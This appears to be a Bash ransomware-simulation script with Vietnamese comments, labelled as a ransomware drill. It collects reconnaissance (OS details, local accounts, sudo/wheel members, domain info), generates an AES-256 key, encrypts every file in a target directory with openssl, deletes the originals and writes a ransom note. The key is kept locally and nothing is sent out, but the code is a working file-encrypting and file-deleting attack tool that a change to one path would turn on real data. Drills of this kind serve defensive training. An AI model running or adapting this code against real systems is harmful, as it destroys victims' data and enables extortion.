#!/bin/bash

# Dừng script ngay khi có lệnh nào đó thất bại
set -e

# ========================= PHẦN 1: CẤU HÌNH VÀ THU THẬP THÔNG TIN =========================

# --- CÀI ĐẶT CHUNG ---
# Thư mục đích để mã hóa
TARGET_DIR="/home/namtn/encrypt" 
RANSOM_NOTE="_FILES_ENCRYPTED_.txt"
EXTENSION=".drill"

# Tên file output sẽ được đặt theo tên máy tính (hostname)
HOSTNAME_VAR=$(hostname)
# File output sẽ được lưu bên trong thư mục đích
OUTPUT_FILE="${TARGET_DIR}/${HOSTNAME_VAR}.txt" 

echo "[INFO] Bắt đầu script..."
echo "[INFO] File lưu thông tin và key sẽ là: $OUTPUT_FILE"
echo ""

# --- KIỂM TRA ĐIỀU KIỆN BAN ĐẦU ---
# Kiểm tra xem thư mục đích có tồn tại không
if [ ! -d "$TARGET_DIR" ]; then
    echo "[LỖI] Thư mục \"$TARGET_DIR\" không tồn tại."
    exit 1
fi

# --- THU THẬP THÔNG TIN HỆ THỐNG ---
echo "Đang thu thập thông tin hệ thống... Vui lòng chờ."

# Xóa file output cũ nếu có và tạo file mới với tiêu đề
echo "THÔNG TIN HỆ THỐNG ($HOSTNAME_VAR)" > "$OUTPUT_FILE"
echo "Chạy vào lúc: $(date)" >> "$OUTPUT_FILE"
echo "==============================================" >> "$OUTPUT_FILE"
echo "" >> "$OUTPUT_FILE"

# 1, 2 & 3. Thông tin OS, phiên bản và bản vá
echo "[1, 2, 3] THÔNG TIN HỆ ĐIỀU HÀNH, PHIÊN BẢN & BẢN VÁ" >> "$OUTPUT_FILE"
echo "---------------------------------------------------" >> "$OUTPUT_FILE"
OS_TYPE=$(uname)
if [ "$OS_TYPE" = "Linux" ]; then
    if [ -f /etc/os-release ]; then
        cat /etc/os-release >> "$OUTPUT_FILE"
    else
        uname -a >> "$OUTPUT_FILE"
    fi
elif [ "$OS_TYPE" = "Darwin" ]; then
    sw_vers >> "$OUTPUT_FILE"
fi
echo "Kernel Version: $(uname -r)" >> "$OUTPUT_FILE"
echo "" >> "$OUTPUT_FILE"

# 4. Danh sách tài khoản và quyền quản trị
echo "[4] TÀI KHOẢN NGƯỜI DÙNG VÀ QUYỀN QUẢN TRỊ" >> "$OUTPUT_FILE"
echo "--------------------------------------------" >> "$OUTPUT_FILE"
echo "--- Tất cả tài khoản người dùng (Local):" >> "$OUTPUT_FILE"
cut -d: -f1 /etc/passwd >> "$OUTPUT_FILE"
echo "" >> "$OUTPUT_FILE"
echo "--- Tài khoản có quyền Quản trị (sudo/wheel group members):" >> "$OUTPUT_FILE"
grep -E '^sudo|^wheel' /etc/group | sed 's/$/,/g' >> "$OUTPUT_FILE"
echo "(Lưu ý: Tài khoản 'root' luôn có quyền quản trị cao nhất)" >> "$OUTPUT_FILE"
echo "" >> "$OUTPUT_FILE"

# 5. Tên máy chủ và thông tin Domain
echo "[5] TÊN MÁY CHỦ (HOSTNAME) VÀ DOMAIN" >> "$OUTPUT_FILE"
echo "--------------------------------------" >> "$OUTPUT_FILE"
echo "Hostname: $HOSTNAME_VAR" >> "$OUTPUT_FILE"
echo -n "Domain Info (from /etc/resolv.conf): " >> "$OUTPUT_FILE"
grep -E '^search|^domain' /etc/resolv.conf >> "$OUTPUT_FILE" || echo "Not configured" >> "$OUTPUT_FILE"
echo "" >> "$OUTPUT_FILE"

echo "[HOÀN TẤT] Đã thu thập xong thông tin hệ thống."
echo ""

# ========================= PHẦN 2: TẠO KEY VÀ MÃ HÓA =========================

# --- KIỂM TRA ĐIỀU KIỆN TRƯỚC KHI MÃ HÓA ---
# Kiểm tra xem OpenSSL đã được cài đặt chưa
if ! command -v openssl &> /dev/null; then
    echo "[LỖI] OpenSSL không được tìm thấy. Vui lòng cài đặt OpenSSL."
    exit 1
fi

# Kiểm tra xem thư mục đã bị mã hóa chưa
echo "[INFO] Kiểm tra trạng thái thư mục..."
check_file=$(find "$TARGET_DIR" -type f -name "*$EXTENSION" -print -quit)
if [ -n "$check_file" ]; then
    echo "[CẢNH BÁO] Đã tìm thấy file đã mã hóa (ví dụ: $check_file)."
    echo "Script sẽ không thực hiện để tránh mã hóa lại dữ liệu."
    exit 0
fi
echo "[INFO] Thư mục chưa bị mã hóa. Bắt đầu quá trình..."
echo ""

# --- TẠO KEY VÀ LƯU VÀO FILE ---
echo "[INFO] Đang tạo key mã hóa..."
# Tạo key và lưu vào biến KEY
KEY=$(openssl rand -base64 32)

# Ghi key vào cuối file output
echo "==============================================" >> "$OUTPUT_FILE"
echo "" >> "$OUTPUT_FILE"
echo "[KEY MÃ HÓA] - Hãy lưu key này cẩn thận để giải mã" >> "$OUTPUT_FILE"
echo "---------------------------------------------------" >> "$OUTPUT_FILE"
echo "$KEY" >> "$OUTPUT_FILE"

echo "[INFO] Đã tạo key và lưu vào file: $OUTPUT_FILE"
echo ""

# --- TIẾN HÀNH MÃ HÓA ---
# Chuyển đến thư mục đích để lệnh find hoạt động chính xác
cd "$TARGET_DIR"

echo "[INFO] Bắt đầu quá trình mã hóa..."
# Dùng find để lặp qua các file, loại trừ chính nó, file output và file ransom note
# -print0 và while read -d $'\0' để xử lý an toàn các tên file có ký tự đặc biệt
find . -type f \
    -not -name "$(basename "$OUTPUT_FILE")" \
    -not -name "$RANSOM_NOTE" \
    -not -name "*$EXTENSION" \
    -not -path "./$(basename "$0")" \
    -print0 | while IFS= read -r -d $'\0' file; do
        # Mã hóa file bằng key trong biến, nếu thành công thì xóa file gốc (&&)
        openssl enc -aes-256-cbc -salt -in "$file" -out "$file$EXTENSION" -pass pass:"$KEY" -pbkdf2 && rm "$file"
done

# --- TẠO FILE CẢNH BÁO ---
echo "[INFO] Đang tạo file cảnh báo..."
# Sử dụng Here Document (cat << EOF) để tạo file text dễ dàng
cat << EOF > "$RANSOM_NOTE"
@@@ CẢNH BÁO QUAN TRỌNG @@@

Tất cả các file quan trọng của bạn trong thư mục $TARGET_DIR đã bị MÃ HÓA.
Để khôi phục lại file, bạn cần key giải mã duy nhất.

Đây là một phần của DIỄN TẬP RANSOMWARE.
Nếu đây là tình huống thực, bạn sẽ được yêu cầu trả tiền chuộc.

Vui lòng báo cáo sự cố này cho đội ngũ IT/Security của bạn ngay lập tức.
Key giải mã đã được lưu cùng thông tin hệ thống trong file: $(basename "$OUTPUT_FILE")
EOF

echo
echo "[HOÀN TẤT] Quá trình mã hóa đã hoàn thành."
echo "Toàn bộ thông tin hệ thống và key giải mã đã được lưu tại: $OUTPUT_FILE"